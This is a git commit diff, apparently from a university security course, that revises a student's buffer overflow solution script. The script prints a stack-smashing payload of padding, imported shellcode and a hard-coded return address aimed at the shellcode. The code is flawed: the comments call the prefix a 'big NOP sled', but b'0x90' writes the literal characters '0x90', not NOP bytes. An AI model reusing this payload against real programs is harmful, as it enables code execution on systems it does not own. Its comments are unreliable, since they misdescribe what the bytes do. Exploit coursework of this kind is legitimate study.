724c6dd76ba05da12e183fd24a197ee6b4f397f5
Libby Cox <libbycox@umich.edu>
2025-04-02 14:56:53 +0000

    Automatic commit by test script for libbycox

--- sol6.py
+++ sol6.py
@@ -3,8 +3,10 @@
 import sys
 
 from shellcode import shellcode
-
-sys.stdout.buffer.write(b'0x90' + (0x70-56)*b'A'+shellcode+(8*b'A')+(2+0x7ffffff6d4e8).to_bytes(8,"little"))
-# adding a big NOP sled before the shellcode so the return address doesn’t have to be super precise
+#sys.stdout.buffer.write(b'A'*10)
+sys.stdout.buffer.write(b'0x90' + (0x70-56)*b'A'+shellcode+(8*b'A')+(0x7ffffff6d110).to_bytes(8,"little"))
+# adding a big noop sled before the shellcode so the return address doesn’t have to be super precise
 # can no longer write the return address into it bc we don't know the exact offset
 # aren't subtracting 54 bc we have 2 byte noop --> subtracting 56
+# need to add code so that no matter how the stack organizes itself, I am always returning the entire shellcode
+# writing to the address of the shellcode
